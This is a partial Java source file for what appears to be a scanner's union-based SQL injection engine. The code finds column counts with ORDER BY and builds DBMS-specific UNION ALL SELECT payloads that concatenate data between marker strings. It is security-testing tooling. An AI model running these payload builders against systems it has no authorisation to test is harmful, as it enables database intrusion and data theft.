...
/**
 * Union-based SQL injection query engine.
 * This module allows the detection of OrderBy-based and Union-based
 * SQL injection payload testing incrementally a specific column range.
 * Each candidated vulnerability is then confirmed launching a specially
 * crafted payload (a concatenated string derived by a control query) and
 * verifying if it's correctly evaluated by the backend application.
 * 
 * @author yhawke (2013)
 */
public class SQLiUnionEngine {
 
    // Step used in ORDER BY technique used for finding the right number of columns in UNION payload injections
    ...
    private boolean confirmUnionTest(int count, int where) {
        ...
        for (int position = 0; position < count; position++) {
            ...
            //SQLiPayloadManager.removeReflectiveValues(msg.getResponseHeader().toString(), payload);
            ...
            if (content.contains(controlToken)) {
                ...
                if (plugin.wasLastRequestDBMSError() && count > 1) {
                    log.warn("combined UNION/error-based SQL injection case found on column "
                            + (position + 1) + "." 
    ...
    private static final Pattern SELECT_CASE_PATTERN = Pattern.compile("\\ASELECT" + PREFIX_REGEX + "\\s+(\\(CASE WHEN\\s+.+\\s+END\\))", Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_FROM_PATTERN = Pattern.compile("\\ASELECT" + PREFIX_REGEX + "\\s+(.+?)\\s+FROM\\s+", Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_DISTINCT_PATTERN = Pattern.compile("\\ASELECT" + PREFIX_REGEX + "\\s+DISTINCT\\((.+?)\\)\\s+FROM", Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_PATTERN = Pattern.compile("\\ASELECT" + PREFIX_REGEX + "\\s+(.*)", Pattern.CASE_INSENSITIVE);
    private static final Pattern SELECT_TOP_PATTERN = Pattern.compile("\\ASELECT\\s+TOP\\s+[\\d]+\\s+(.+?)\\s+FROM", Pattern.CASE_INSENSITIVE);
    private static final Pattern EXISTS_PATTERN = Pattern.compile("EXISTS(.*)", Pattern.CASE_INSENSITIVE);
    private static final Pattern SUBSTR_PATTERN = Pattern.compile("\\A(SUBSTR|MID\\()", Pattern.CASE_INSENSITIVE);
    private static final Pattern MINMAX_PATTERN = Pattern.compile("(?:MIN|MAX)\\(([^\\(\\)]+)\\)", Pattern.CASE_INSENSITIVE);

    /**
     * Take in input a payload string and return its processed nulled,
     * casted and concatenated payload string (useful for UNION-based payload strings)
     * where we need to give back results inside a single column.
     * 
     * Examples:
        ...
        switch (dbms) {
            ...
            case MYSQL:
                ...
                if (fieldExists || fieldSelectCase) {
                    concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('" + SQLiPayloadManager.charsStart + "',");
                    concatenatedQuery += ",'" + SQLiPayloadManager.charsStop + "')";
                                
                } else if (fieldSelectFrom) {
                    concatenatedQuery = concatenatedQuery.replace("SELECT ", "CONCAT('" + SQLiPayloadManager.charsStart + "',");
                    concatenatedQuery = concatenatedQuery.replace(" FROM ", ",'" + SQLiPayloadManager.charsStop + "') FROM ");
                    ...
                    concatenatedQuery = "CONCAT('" + SQLiPayloadManager.charsStart + "'," 
                            + concatenatedQuery 
            ...
            case DB2:                
                ...
                if (fieldExists) {
                    concatenatedQuery = concatenatedQuery.replace("SELECT ", "'" + SQLiPayloadManager.charsStart + "'||");
                    concatenatedQuery += "||'" + SQLiPayloadManager.charsStop + "'";
                
                } else if (fieldSelectCase) {
                    concatenatedQuery = concatenatedQuery.replace("SELECT ", "'" + SQLiPayloadManager.charsStart + "'||(SELECT ");
                    concatenatedQuery += ")||'" + SQLiPayloadManager.charsStop + "'";
                    ...
                    concatenatedQuery = "'" + SQLiPayloadManager.charsStart + "'||"
                            + concatenatedQuery 
                            + "||'" + SQLiPayloadManager.charsStop + "'";
                }                
                break;
            ...
            case SYBASE:
                ...
                if (fieldExists) {
                    ...
                    Pattern topNumPattern = Pattern.compile("\\ASELECT\\s+TOP\\s+([\\d]+)\\s+", Pattern.CASE_INSENSITIVE);
                    Matcher matcher = topNumPattern.matcher(concatenatedQuery);
                    String topNum = (matcher.find()) ? matcher.group(1) : null;
                
                    concatenatedQuery = concatenatedQuery.replace("SELECT TOP " + topNum + " ", "TOP " + topNum + " '" + SQLiPayloadManager.charsStart + "'+");
                    concatenatedQuery = concatenatedQuery.replace(" FROM ", "+'" + SQLiPayloadManager.charsStop + "' FROM ");
    ...
    /**
     * Take in input a sequence of fields and return its processed
     * nulled, casted and concatenated fields list
     * 
     * Examples:
    ...
    private String getNullCastAndConcatenatedFields(String fields) {
        ...
        if (fields.startsWith("(CASE") || 
            ...
            String delimiterStr = dbmsDelimiter + '\'' + SQLiPayloadManager.charsDelimiter + '\'' + dbmsDelimiter;
    ...
    /**
     * 
     * Take in input an payload (pseudo payload) string and return its processed UNION ALL SELECT payload.
     * 
     * Examples:
     ...
     * 
     * @param payload it is a processed payload string unescaped to be forged within an UNION ALL SELECT statement
     ...
     */
    private String prepareUnionPayload(String query, int position, int count, String charSequence, String multipleUnions, boolean limited, String fromTable) {
        ...
        StringBuilder unionQuery = new StringBuilder(plugin.preparePrefix(baseQuery, prefix, where, test));
        ...
        Pattern intoPattern = Pattern.compile("(\\s+INTO (DUMP|OUT)FILE\\s+\\'(.+?)\\')", Pattern.CASE_INSENSITIVE);
    ...
    private boolean orderByTest(int columnNumber) {
        ...
        return (((content != null) && !orderPattern.matcher(content).lookingAt()) && 
            ...
            ((content != null) && content.contains("data types cannot be compared or sorted")));
    }

    /**
     * Return the number of columns that could be found
    ...
    public void setUnionChars(String uChars) {
        this.uChars = uChars;
        this.where = (uChars == null) ? SQLiPayloadManager.WHERE_ORIGINAL : SQLiPayloadManager.WHERE_NEGATIVE;
    }
